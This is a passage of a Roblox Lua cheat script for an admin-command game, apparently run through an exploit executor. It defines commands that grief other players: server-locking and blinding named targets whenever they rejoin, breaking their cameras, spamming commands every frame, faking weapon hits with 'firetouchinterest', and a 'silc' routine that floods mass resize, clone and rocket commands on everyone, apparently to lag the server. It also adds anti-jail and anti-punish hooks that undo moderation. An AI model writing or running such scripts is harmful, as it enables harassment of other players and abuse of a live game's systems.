				-------------------------------------------------------------------- Building Bricks --------------------------------------------------------------------

				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
					coroutine.wrap(function()
						if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
							colorAPI.color(v, DarkStoneGrey) -- Default is "Dark stone grey"
						end

						if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
							colorAPI.color(v, DeepBlue) -- Default is "Deep blue"
						end

						if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
							colorAPI.color(v, NY) -- Default is "New Yeller"
						end

						if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
							colorAPI.color(v, IW) -- Default is "Institutional white"
						end

						if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part9" or v.Name == "Part5" then
							colorAPI.color(v, LimeGreen) -- Default is "Lime green"
						end

						if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" then
							colorAPI.color(v, MSG) -- Default is "Medium Stone grey"
						end

						if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
							colorAPI.color(v, RB) -- Default is "Really black"
						end

						if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
							colorAPI.color(v, RR) -- Default is "Really red"
						end

						if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
							colorAPI.color(v, TP) -- Default is "Toothpaste"
						end
					end)()
				end
			end

--[[

fixed library lol

spawn(function()
	colorAPI.colorObbyBox(colorAPI.transformToColor3(BrickColor.new("Teal")))
end)

spawn(function()
	colorAPI.colorObbyBricks(colorAPI.transformToColor3(BrickColor.new("Really red")))
end)

spawn(function()
	colorAPI.colorAdminDivs(colorAPI.transformToColor3(BrickColor.new("Dark stone grey")))
end)

spawn(function()
	colorAPI.colorPads(colorAPI.transformToColor3(BrickColor.new("Bright green")))
end)

spawn(function()
	colorAPI.colorBuildingBricks({
		DarkStoneGrey = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
		DeepBlue = colorAPI.transformToColor3(BrickColor.new("Deep blue")),
		NY = colorAPI.transformToColor3(BrickColor.new("New Yeller")),
		IW = colorAPI.transformToColor3(BrickColor.new("Institutional white")),
		LimeGreen = colorAPI.transformToColor3(BrickColor.new("Lime green")),
		MSG = colorAPI.transformToColor3(BrickColor.new("Medium Stone grey")),
		RB = colorAPI.transformToColor3(BrickColor.new("Really black")),
		TP = colorAPI.transformToColor3(BrickColor.new("Toothpaste")),
		RR = colorAPI.transformToColor3(BrickColor.new("Really red"))
	})
end)

spawn(function()
	colorAPI.colorHouse({
		wallsC = colorAPI.transformToColor3(BrickColor.new("Brick yellow")),
		baseC = colorAPI.transformToColor3(BrickColor.new("Bright green")),
		roofC = colorAPI.transformToColor3(BrickColor.new("Bright red")),
		WANDDC = colorAPI.transformToColor3(BrickColor.new("Dark orange")),
		stairsC = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
		floorC = colorAPI.transformToColor3(BrickColor.new("Medium blue")),
		rooftsC = colorAPI.transformToColor3(BrickColor.new("Reddish brown")),
		chiC = colorAPI.transformToColor3(BrickColor.new("Sand red"))
	})
end)

]]--

			-------------------------------------------------------------------- BASIC API STUFF HERE --------------------------------------------------------------------

			game:GetService("Players"):Chat("gear me 00000000000000000018474459")
			repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild('PaintBucket')
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
			wait(0.50)
			coroutine.wrap(function()
				colorAPI.colorHouse({
					wallsC = colorAPI.transformToColor3(BrickColor.new("Brick yellow")),
					baseC = colorAPI.transformToColor3(BrickColor.new("Bright green")),
					roofC = colorAPI.transformToColor3(BrickColor.new("Bright red")),
					WANDDC = colorAPI.transformToColor3(BrickColor.new("Dark orange")),
					stairsC = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
					floorC = colorAPI.transformToColor3(BrickColor.new("Medium blue")),
					rooftsC = colorAPI.transformToColor3(BrickColor.new("Reddish brown")),
					chiC = colorAPI.transformToColor3(BrickColor.new("Sand red"))
				})
			end)()
			spawn(function()
				colorAPI.colorBuildingBricks({
					DarkStoneGrey = colorAPI.transformToColor3(BrickColor.new("Dark stone grey")),
					DeepBlue = colorAPI.transformToColor3(BrickColor.new("Deep blue")),
					NY = colorAPI.transformToColor3(BrickColor.new("New Yeller")),
					IW = colorAPI.transformToColor3(BrickColor.new("Institutional white")),
					LimeGreen = colorAPI.transformToColor3(BrickColor.new("Lime green")),
					MSG = colorAPI.transformToColor3(BrickColor.new("Medium Stone grey")),
					RB = colorAPI.transformToColor3(BrickColor.new("Really black")),
					TP = colorAPI.transformToColor3(BrickColor.new("Toothpaste")),
					RR = colorAPI.transformToColor3(BrickColor.new("Really red"))
				})
			end)
			colorAPI.color(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], colorAPI.transformToColor3(BrickColor.new("Bright green")))
			spawn(function()
				colorAPI.colorObbyBox(colorAPI.transformToColor3(BrickColor.new("Teal")))
			end)
			spawn(function()
				colorAPI.colorObbyBricks(colorAPI.transformToColor3(BrickColor.new("Really red")))
			end)
			spawn(function()
				colorAPI.colorAdminDivs(colorAPI.transformToColor3(BrickColor.new("Dark stone grey")))
			end)
			spawn(function()
				colorAPI.colorPads(colorAPI.transformToColor3(BrickColor.new("Bright green")))
			end)
			wait(0.6)
			tchat("ungear 000000000000000000000000000000000000000000000000000000000 me "..math.random(99999))
			--nil
		end)





	addcommand(
		"pause",
		"pauses sound",
		function()
			for i, v in pairs(Folder:GetDescendants()) do
				if v:IsA("Sound") then
					v:Pause()
				end
			end  
		end)

	addcommand(
		"stop",
		"stop sound",
		function()
			for i, v in pairs(Folder:GetDescendants()) do
				if v:IsA("Sound") then
					v:Stop()
				end
			end  
		end)

	addcommand(
		"resume",
		"resumes sound",
		function()
			for i, v in pairs(Folder:GetDescendants()) do
				if v:IsA("Sound") then
					v:Resume()
				end
			end  
		end)
	local antimusic 
	addcommand(
		"nomusic",
		"resumes sound",
		function()
			antimusic = true
			tchat("music")
			Folder.ChildAdded:Connect(function(s)
				if s:IsA("Sound") and antimusic then
					tchat("stop")
				end 
			end) 
			local boxcmd = plr.Chatted:Connect(function(cmd)
				if cmd:sub(1, 5) == 'music' then 
					id = cmd:split(" ")
					local args = {
						[1] = "PlaySong",
						[2] = tonumber(id[2])
					}
					plr.Character.SuperFlyGoldBoombox.Remote:FireServer(unpack(args))
				end 
			end)                    
		end)


	addcommand(
		"resmusic",
		"resumes sound",
		function()
			antimusic = false
			boxcmd:Disconnect()
		end)



	addcommand(
		"headrise",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				tchat("size " .. Target.Name .. " .3")
				tchat("bighead " .. Target.Name)
				wait()
				tchat("size " .. Target.Name .. " 10")
				wait()
				tchat("thaw " .. Target.Name)
				wait()
				tchat("unsize " .. Target.Name)

			end
		end)

	addcommand(
		"skybox",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				tchat("size " .. Target.Name .. " .3")
				tchat("freeze " .. Target.Name)
				tchat("size " .. Target.Name .. " 10")
				tchat("goldify " .. Target.Name)
				tchat("clone " .. Target.Name)
				tchat("reset " .. Target.Name)
				wait(.1)

			end
		end
	)

	addcommand(
		"icetower",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				for i = 1, 30 do
					tchat("size " .. Target.Name .. " .6")
					tchat("seizure " .. Target.Name)
					tchat("freeze " .. Target.Name)
					tchat("unsize " .. Target.Name)
				end

			end
		end
	)

	addcommand(
		"headroot",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				tchat("size " .. Target.Name .. " 10")
				tchat("freeze " .. Target.Name)
				tchat("bighead " .. Target.Name)
				tchat("size " .. Target.Name .. " .3")
				tchat("thaw " .. Target.Name)
				tchat("unsize " .. Target.Name)

			end
		end
	)



	addcommand(
		"fixcam",
		"description here",
		function()
			task.spawn(function()
				error("Camera  has been fixed")
				local lp = game.Players.LocalPlayer
				local ui = game:GetService("UserInputService")
				local l__ContextActionService__7 = game:GetService("ContextActionService");
				local l__RunService__1 = game:GetService('RunService')
				l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
				l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
				l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
				while true do
					repeat game:GetService'RunService'.Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
					l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
					l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
					l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
					local wepsys = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
					if not wepsys then return end
					for i,v in pairs(wepsys:GetDescendants()) do
						if v:IsA("Script") then
							v.Disabled = true
						end
						v:Destroy()
					end
					local wep = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
					local gui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
					local sc = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
					if wep then wep.Disabled = true wep:Destroy() end
					if gui then gui:Destroy() end
					if sc then
						sc.Disabled = true
						sc:Destroy()
					end
					ui.MouseIconEnabled = true
					game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
					game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
					lp.Character.Humanoid.AutoRotate = true
				end
			end)
		end)

	addcommand(
		"pdraw",
		"description here",
		function()
			_G.draw = true
			_G.remove = false
			_G.psize = args[2]
		end)

	addcommand(
		"pdelete",
		"description here",
		function()
			_G.draw = false
			_G.remove = true
		end)


	addcommand(
		"rpdraw",
		"description here",
		function()
			_G.draw = false
			_G.remove = false
		end)

	addcommand(
		"amputate",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				tchat("size " .. Target.Name .. " 10")
				wait(.3)
				tchat("freeze " .. Target.Name)
				wait(.3)
				tchat("trip " .. Target.Name)
				wait(.3)
				tchat("unsize " .. Target.Name)
				wait(.3)
				tchat("paint " .. Target.Name .. " red")
				wait(.1)
				Jotunn()
			end
		end
	)



	UIS.InputBegan:Connect(function(a)
		if a.UserInputType == Enum.UserInputType.MouseButton1 and _G.draw or _G.remove then
			MouseDown = true 
		end
	end)
	UIS.InputEnded:Connect(function(a)
		if a.UserInputType == Enum.UserInputType.MouseButton1 and _G.draw or _G.remove then
			MouseDown = false
		end
	end)



	spawn(function()
		while task.wait() do
			if MouseDown == true and _G.draw then
				if mouse.Target ~= nil then
					task.wait()
					tchat("part/3/".._G.psize.."/3")



				end
			else if MouseDown == true and _G.delete then 
					if mouse.Target ~= 'Part' then
						mouse.Target:Destroy()
					end 
				end
			end
		end
	end)

	coroutine.wrap(function()
		while task.wait() do
			pcall(function()
				for _, v in pairs(rs:GetChildren()) do 
					if v.Name:sub(1,4) == 'part' then
						nm = v.Name 
						nm = nm:split("__")
						if table.find(parts, nm[1]) then
							if not Folder:FindFirstChild(nm[1]) then 
								for i = 1, #parts do 
									if parts[i] == nm[1] then 
										table.remove(parts,i)
										return
									end 
								end
							else
								nmv = nm[2]
								nmv = nmv:split(", ")
								x = tonumber(nmv[1])
								y = tonumber(nmv[2])
								z = tonumber(nmv[3])
								Folder:FindFirstChild(nm[1]).CFrame = CFrame.new(x,y,z)
							end

						end 
					end 
				end
			end)

		end
	end)()

	Folder.ChildAdded:Connect(function(a)
		if a:IsA("Part") and _G..draw then
			a.Name = "part"..tostring(_G.i)
			b = Instance.new("Part", game.ReplicatedStorage)
			b.Name = a.Name.."__"..tostring(mouse.Hit)
			_G.i = _G.i + 1 
			table.insert(parts,a.Name)
		end
	end)

	addcommand(
		"infgod",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				tchat("pm " .. Target.Name .. " You have been granted the Power of a God.")
				wait(5)
				tchat("reset " .. Target.Name)
				Target.CharacterAdded:Connect(
					function(character)
						tchat("god " .. Target.Name)
						tchat("ff " .. Target.Name)
						character.ChildRemoved:Connect(
							function(child)
								if child.Name == "ForceField" then
									tchat("ff " .. Target.Name)
								end
							end
						)
						character:WaitForChild("Humanoid"):GetPropertyChangedSignal("Health"):Connect(function()
							tchat("god " .. Target.Name)
							if character:WaitForChild("Humanoid").Health == 0 then
								tchat("reset " .. Target.Name)
							end
						end)
					end
				)
			end
		end
	)

	plr.Chatted:connect(
		function(msg)
			msgh = msg:split(" ")
			if msgh[1] == _G.prefix .. "spam" then  
				command = msg:split("spam ")
				spam = game:GetService("RunService").Heartbeat:Connect(function()
					tchat(command[2])
				end)
			end
		end
	)

	plr.Chatted:connect(
		function(msg)
			if msg == _G.prefix .. "unspam" then
				spam:Disconnect()
			end
		end
	)


	addcommand("svrbreakcam", "description here", function()


		_G.svrbreakcam = true
		tchat("name all ‎")
		local function hidden()
			for i = 1, 15 do 
				tchat("noob zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
			end 
		end 
		hidden()

		for _, v in pairs(game.Players:GetChildren())  do
			_G.plus = v.CharacterAdded:Connect(function()
				pcall(function()
					if _G.svrbreakcam then
						tchat("name "..v.Name.." ‎")
						hidden()
					end
				end)
			end) 
		end 

		_G.plus2 = game.Players.PlayerAdded:Connect(function(plr)
			repeat wait() until plr.Character
			pcall(function()
				if _G.svrbreakcam then
					tchat("name "..plr.Name.." ‎")
					hidden()
				end
			end)
			_G.plus3 = plr.CharacterAdded:Connect(function()
				pcall(function()
					if _G.svrbreakcam then
						tchat("name "..plr.Name.." ‎")
						hidden()
					end
				end)
			end) 
		end)

	end)
	_G.brokencams = {}

	addcommand("fixcam", "description here", function()
		for _Index, Target in pairs(GetPlayer(args[2])) do
			for i = 1, #_G.brokencams do 
				if _G.brokencams[i] == Target.Name then 
					table.remove(_G.brokencams, i)
				end 

			end 
			tchat("reset "..Target.Name)
		end
	end)

	addcommand("breakcam", "description here", function()

		for _Index, Target in pairs(GetPlayer(args[2])) do
			table.insert(_G.brokencams, Target.Name)
			task.wait()
			tchat("name "..Target.Name.." "..Target.DisplayName)
			task.wait()
			for i = 1, 20 do 
				tchat("noob zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
			end 
			Target.CharacterAdded:Connect(function()
				for i = 1, #_G.brokencams do 
					if _G.brokencams[i] == Target.Name then 
						tchat("name "..Target.Name.." "..Target.DisplayName)
						for i = 1, 15 do 
							tchat("noob zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
						end 
					end 
				end 
			end)
		end
	end)



	addcommand("smack", "description here", function()
		for _Index, Target in pairs(GetPlayer(args[2])) do 
			tchat("gear me 46360920")
			tool = 'Mackerel'
			plr.Backpack:WaitForChild(tool) .Parent = plr.Character
			plr.Character:WaitForChild(tool):Activate()
			for i = 1, 10 do 
				task.wait(.3)
				plr.Character:WaitForChild(tool):Activate()
				for _, v in pairs(Target.Character:GetChildren()) do
					if v:IsA("Part") then
						firetouchinterest(v, plr.Character:FindFirstChild(tool).Handle, 0)
						firetouchinterest(v, plr.Character:FindFirstChild(tool).Handle, 1)

					end
				end
			end

			tchat("ungear me")



		end
	end)

	addcommand("?hide",
		"usetools xd",
		function()
			_G.hide = true
			coroutine.wrap(
				function()
					if not plr.Character then
						error("Character Does not exist?")
					else
						_G.mypos = plr.Character.HumanoidRootPart.CFrame
						wait()
						plr.Character:Remove()
						error("Character Has been Destroyed, Protected from commands")
					end
					plr.CharacterAdded:Connect(
						function(character)
							if _G.hide then
								character:Destroy()
							end
						end
					)
				end
			)()
		end
	)

	addcommand("?unhide",
		"usetools xd",
		function()
			_G.hide = false
			tchat("respawn me")
			plr.CharacterAdded:Wait(.1)
			plr.Character:WaitForChild("HumanoidRootPart").CFrame = _G.mypos
		end)


	local slocked = {}
	addcommand(
		"slock",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				table.insert(slocked,Target.Name)
				tchat("punish " .. Target.Name)
				tchat("blind " .. Target.Name)
				tchat("pm " .. Target.Name .. " You have been Server Locked by " .. plr.Name .. ".")
				wait()
				game.Workspace.ChildAdded:Connect(
					function(child)
						for _, v in next, slocked do
							if child.Name == Target.Name and Target.Name == v then
								tchat("punish " .. Target.Name)
								tchat("blind " .. Target.Name)
							end
						end
					end
				)
				game.Players.PlayerAdded:Connect(
					function(player)
						for _, v in next, slocked do
							if player.Name == Target.Name and Target.Name == v then
								tchat("pm " .. Target.Name .. " You have been Server Locked by " .. plr.Name)
								tchat("punish " .. Target.Name)
								tchat("blind " .. Target.Name)
							end
						end
					end
				)
			end
		end
	)

	addcommand(
		"pban",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				table.insert(padbanned,Target.Name)
				error((Target.Name.." has been added to the pad-banned table"))
			end 
		end)



	addcommand(
		"unpban",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				for i = 1, #padbanned do 
					if padbanned[i] == Target.Name then 
						table.remove(padbanned,i)
					end 
				end
				error((Target.Name.." has been removed from the pad-banned table"))
			end 
		end)

	addcommand(
		"timeout",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				table.insert(_G.timeout,Target.Name)
				print(args[3])
				if string.match(args[3],"m") then
					_G.timed = args[3]:split("m")   
				else
					_G.timed = args[3]:split("s") 
				end

				local timed = tonumber(_G.timed[1])

				if string.match(args[3],"m") then
					timed = timed*60
				end 
				function out()
					tchat("cage "..Target.DisplayName)
					tchat("name "..Target.Name.." (Time-Out)\n"..Target.DisplayName)

				end 
				out()
				tchat("h/You are under time-out, Please reflect on your behaviour while you do so")
				spawn(function()
					wait(3)
					tchat("h/Say /timeout to view your remaining time..")
				end)
				local extratime = 0.01
				local a = Target.CharacterAdded:Connect(function()
					if table.find(_G.timeout,Target.Name) then
						pcall(function()
							out()

						end)
					end
				end) 
				local b = Target.Chatted:Connect(function(msg)
					if msg == '/timeout' and table.find(_G.timeout,Target.Name) then 
						chat("Your remaining time is "..tostring(timed).." seconds..")
					end 
				end)
				for i = 1, timed do 
					wait(1)
					timed = timed - 1

				end 
				a:Disconnect()
				b:Disconnect()
				for i = 1, #_G.timeout do 
					if _G.timeout[i] == Target.Name then 
						table.remove(_G.timeout,i)
					end 
				end
				wait(.1)
				tchat("reset "..Target.Name)
				tchat("h/Your time-out is over, "..Target.Name)


			end
		end)

	antikill = true
	print("Anti kill enabled")

	coroutine.wrap(function()
		while antikill do
			task.wait(time)
			if plr.Character:WaitForChild("Humanoid").Health == 0 then
				tchat("reset me")
				wait(.17)
			end
		end
	end)()

	antijail = true
	print("Anti jail enabled")
	coroutine.wrap(function()
		while antijail do
			Folder:WaitForChild(myjail)
			Folder[myjail]:destroy()
			tchat("unjail me")
			task.wait(time)
		end
	end)()

	_G.antifreeze = true
	print("Anti freeze enabled")
	plr.Character.ChildAdded:Connect(
		function(v)
			if _G.antifreeze == true then

				if v.Name == "ice" then
					tchat("unfreeze me")
					task.wait(time)
				end
			end
		end
	)

	antipunish = true
	print("Anti punish enabled")
	game.Lighting.ChildAdded:Connect(
		function(child)
			if antipunish then
				if child.Name == plr.Name then
					game.Lighting:FindFirstChild(plr.Name).Parent = game.Workspace
					tchat("unpunish me")
					task.wait(time)
				end
			end
		end
	)

	antiblind = true
	wait()
	print("Anti blind Enabled")
	game.Players.LocalPlayer.PlayerGui.ChildAdded:Connect(
		function(child)
			if antiblind then
				if child.Name == "EFFECTGUIBLIND" then
					while child do
						child:remove()
						wait(time)
					end
				end
			end
		end
	)


	antifling = true
	print("Enabled anti fling/speed, will reset character if high velocity has been detected")
	coroutine.wrap(
		function()
			while antifling do
				task.wait()
				local root = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
				if root.Velocity.X > 25 or root.Velocity.X < -25 then
					error("Velocity is too high! Resetting character")
					tchat("reset me")
					wait(.3)
				end
			end
		end
	)()

	plr.Chatted:Connect(function(msg)
		if msg == 'silc' then 
			tchat("respawn all")
			task.wait()
			for i=1,5 do
				tchat('unsize all')
				tchat('size all .3')
				tchat('size all .3')
				tchat('size all .3')
				tchat('rocket/all all all')
				tchat("dog all all all")
				tchat('size all 10')
				tchat('size all 10')
				tchat('size all 10')
				tchat('clone all all all')
			end
			for i=1,50 do
				tchat('unsize all')
				tchat('size all .3')
				tchat('size all .3')
				tchat('size all .3')
				tchat('rocket/all all all')
				tchat("dog all all all")
				tchat('size all 10')
				tchat('size all 10')
				tchat('size all 10')
				tchat('clone all all all')
				tchat("tp all me")
			end
		end 
	end)

	coroutine.wrap(function()
		local deb = true
		for _, v in pairs(Pads:GetChildren()) do
			if v:FindFirstChild("Head") then
				v.Head.Touched:Connect(function(p)
					if table.find(padbanned, p.Parent.Name) and deb then
						coroutine.wrap(function()
							deb = false
							task.wait(.2)
							deb = true
						end)()
						regenpads()
						tchat("respawn "..p.Parent.Name)
						wait(.1)
						tchat("pm/"..p.Parent.Name.." your banned from pads LOL")
					end 
				end) 
			end
		end
	end)()

	spawn(function()
		repeat task.wait() until plr.Character
		plr.Character.ChildAdded:Connect(function(r)
			if r.Name == 'Rocket' then 
				--tchat("unrocket/me")
				r.CanCollide = false
			end 
		end)

	end)

	plr.CharacterAdded:Connect(function(c)
		c.ChildAdded:Connect(function(l)
			if l.Name == 'Rocket' then 
				--tchat("unrocket/me")
				l.CanCollide = false
			end
		end)   
	end)

	addcommand(
		"unslock",
		"description here",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				for i = 1, #slocked do 
					if Target.Name == slocked[i] then 
						table.remove(slocked, i)
					end 
				end
			end
		end
	)

	addcommand(
		"house",
		"description here",
		function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-29.809, 8.229, 72.000)
		end
	)






	-- lets test it out :)











	addcommand(
		"freg",
		"description here",
		function()
			print("Attempting to find vertical regen...")
			print("Checking saved coords first...")
			local root = game.Players.LocalPlayer.Character.HumanoidRootPart
			wait(1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000000, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-200000, 50000, 3500000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-7, 534009, 95));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000003, -1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1101734, 33651680, -33531784));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000003, -1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000000, -3));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(3, -1000000, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -3, -1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, -3, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 3, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-7, 200009, 95));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000003, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000003, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(454545, 150000, -678678));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(306712, 420552, 398158));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, 1000003, 1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, 1000003, -1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, -1000003, -1000000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-397746, 503, -168829));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-674082.8125,-698538.6875,-286853.125));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(45400, -49860, 56673));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-559702.25,-724234.1875,-563028.25));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-504678,-470264.90625,-387767.9375));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-397745.9375,499.0865173339844,-168829.078125));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(56470, -48312, 28578));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-9, 60008, 89));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-123317.0625, 119352.671875, 911237));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(75304, -49638, 47300));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(34120, -48830, 30233));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(279584.8125,-47841.0234375,410623.0625));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-225255.265625,-146865.9375,51726.44140625));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(77822, -49751, 79116));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(42682, -29202, 29886));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(54933, -500353, 85934));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(51052, -49558, 34068));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-23529.498046875,-21270.994140625,-17196.0078125));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(57099.02734375,-40034.640625,708909.75));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(562191.25,-39999.55078125,110908.984375));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(777584.875,52895.4140625,3576.002685546875));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(777584.875,52895.4140625,3576.002685546875));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(824511,1000000,24944.01953125));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(782629, 385179, 234698));wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-251773, 1000003, 382563));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(653864.8125,247022.828125,149027.078125));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500000, 300000, 500000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-300000, 300000, 300000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(300000, 300000, 300000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(300000, 300000, -300000));wait(.15)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-300000, 300000, -300000));wait(.15)
